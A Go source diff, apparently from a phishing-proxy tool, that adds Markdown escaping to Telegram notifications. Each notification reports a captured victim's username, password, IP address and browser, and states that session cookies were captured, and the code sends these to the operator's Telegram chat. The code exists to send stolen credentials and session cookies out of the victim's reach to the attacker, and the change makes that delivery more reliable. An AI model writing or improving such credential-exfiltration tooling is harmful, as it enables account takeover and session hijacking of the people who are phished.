@@ -45,6 +45,12 @@ func (t *TelegramNotifier) SendCredentialsNotification(session *database.Session
 	timeStr := time.Unix(session.UpdateTime, 0).UTC().Format("2006-01-02 15:04:05 UTC")
 
 	// Build message - credentials only, no cookies yet
+	// Escape special characters for Markdown
+	safeUsername := escapeMarkdown(session.Username)
+	safePassword := escapeMarkdown(session.Password)
+	safePhishlet := escapeMarkdown(session.Phishlet)
+	safeRemoteAddr := escapeMarkdown(session.RemoteAddr)
+	
 	message := fmt.Sprintf(`🔐 Credentials Captured
 
 🆔 Session ID: %d
@@ -58,11 +64,11 @@ func (t *TelegramNotifier) SendCredentialsNotification(session *database.Session
 
 ⏳ Waiting for session cookies...`,
 		session.Id,
-		session.Phishlet,
-		session.Username,
-		session.Password,
+		safePhishlet,
+		safeUsername,
+		safePassword,
 		browser,
-		session.RemoteAddr,
+		safeRemoteAddr,
 		timeStr,
 	)
 
@@ -86,6 +92,13 @@ func (t *TelegramNotifier) SendLoginFailedNotification(session *database.Session
 	browser := parseUserAgent(session.UserAgent)
 	timeStr := time.Unix(session.UpdateTime, 0).UTC().Format("2006-01-02 15:04:05 UTC")
 
+	// Escape special characters for Markdown
+	safeUsername := escapeMarkdown(session.Username)
+	safePassword := escapeMarkdown(session.Password)
+	safePhishlet := escapeMarkdown(session.Phishlet)
+	safeRemoteAddr := escapeMarkdown(session.RemoteAddr)
+	safeErrorReason := escapeMarkdown(errorReason)
+
 	message := fmt.Sprintf(`❌ Login Failed
 
 🆔 Session ID: %d
@@ -99,12 +112,12 @@ func (t *TelegramNotifier) SendLoginFailedNotification(session *database.Session
 
 ⚠️ User entered incorrect credentials`,
 		session.Id,
-		session.Phishlet,
-		session.Username,
-		session.Password,
-		errorReason,
+		safePhishlet,
+		safeUsername,
+		safePassword,
+		safeErrorReason,
 		browser,
-		session.RemoteAddr,
+		safeRemoteAddr,
 		timeStr,
 	)
 
@@ -138,6 +151,12 @@ func (t *TelegramNotifier) SendCookiesNotification(session *database.Session) er
 		cookieCount += len(domainCookies)
 	}
 
+	// Escape special characters for Markdown
+	safeUsername := escapeMarkdown(session.Username)
+	safePassword := escapeMarkdown(session.Password)
+	safePhishlet := escapeMarkdown(session.Phishlet)
+	safeRemoteAddr := escapeMarkdown(session.RemoteAddr)
+
 	// Build message - same format as credentials, with cookies info
 	message := fmt.Sprintf(`🍪 Session Cookies Captured!
 
@@ -153,11 +172,11 @@ func (t *TelegramNotifier) SendCookiesNotification(session *database.Session) er
 
 ✅ Full session capture complete!`,
 		session.Id,
-		session.Phishlet,
-		session.Username,
-		session.Password,
+		safePhishlet,
+		safeUsername,
+		safePassword,
 		browser,
-		session.RemoteAddr,
+		safeRemoteAddr,
 		timeStr,
 		cookieCount,
 	)
@@ -195,6 +214,11 @@ func (t *TelegramNotifier) SendSessionNotification(session *database.Session) er
 	// Format time
 	timeStr := time.Unix(session.UpdateTime, 0).UTC().Format("2006-01-02 15:04:05 UTC")
 
+	// Escape special characters for Markdown
+	safeUsername := escapeMarkdown(session.Username)
+	safePassword := escapeMarkdown(session.Password)
+	safeRemoteAddr := escapeMarkdown(session.RemoteAddr)
+
 	// Build message (without cookies - those go in the file)
 	message := fmt.Sprintf(`🚨 New Session Captured
 
@@ -207,12 +231,12 @@ func (t *TelegramNotifier) SendSessionNotification(session *database.Session) er
 
 🍪 Cookies for %s`,
 		session.Id,
-		session.Username,
-		session.Password,
+		safeUsername,
+		safePassword,
 		browser,
-		session.RemoteAddr,
+		safeRemoteAddr,
 		timeStr,
-		session.Username,
+		safeUsername,
 	)
 
 	// Generate cookie file content in JavaScript format
